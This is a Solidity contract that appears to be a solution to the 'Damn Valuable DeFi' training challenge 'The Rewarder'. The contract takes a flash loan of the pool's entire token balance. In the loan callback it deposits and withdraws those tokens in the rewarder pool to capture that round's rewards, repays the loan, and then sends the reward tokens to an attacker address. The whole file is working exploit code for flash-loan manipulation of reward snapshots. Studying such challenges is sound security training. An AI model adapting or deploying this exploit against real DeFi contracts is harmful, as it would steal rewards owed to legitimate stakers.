// SPDX-License-Identifier: MIT

import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

contract AttacContrac {
    address public flashLoanPoolAddress;
    address public theRewarderPoolAddress;
    address public attacker;

    FlashLoanerPool public flashLoanPool;
    DamnValuableToken public damnValuableToken;
    TheRewarderPool public theRewarderPool;
    RewardToken public rewardToken;

    constructor(
        address _flashLoanPoolAddr,
        address _damnValuableTokenAddr,
        address _theRewarderPoolAddr,
        address _rewardTokenAddr,
        address _attacker
    ) {
        flashLoanPoolAddress = _flashLoanPoolAddr;
        theRewarderPoolAddress = _theRewarderPoolAddr;
        attacker = _attacker;

        flashLoanPool = FlashLoanerPool(_flashLoanPoolAddr);
        damnValuableToken = DamnValuableToken(_damnValuableTokenAddr);
        theRewarderPool = TheRewarderPool(_theRewarderPoolAddr);
        rewardToken = RewardToken(_rewardTokenAddr);
    }

    function callFlashLoan() external {
        uint256 flashLoanPoolAddressBal = damnValuableToken.balanceOf(
            flashLoanPoolAddress
        );
        flashLoanPool.flashLoan(flashLoanPoolAddressBal);
    }

    function receiveFlashLoan(uint256 amount) external {
        // approve rewarderPool addr to spend attaccontrac's DVT tokens
        damnValuableToken.approve(theRewarderPoolAddress, amount);

        // deposit DVT tokens
        theRewarderPool.deposit(amount);

        // withdraw DVT tokens
        theRewarderPool.withdraw(amount);

        // transfer DVT back to flashLoan contract
        damnValuableToken.transfer(flashLoanPoolAddress, amount);
    }

    function sendRewardTokensToAttacker() external {
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
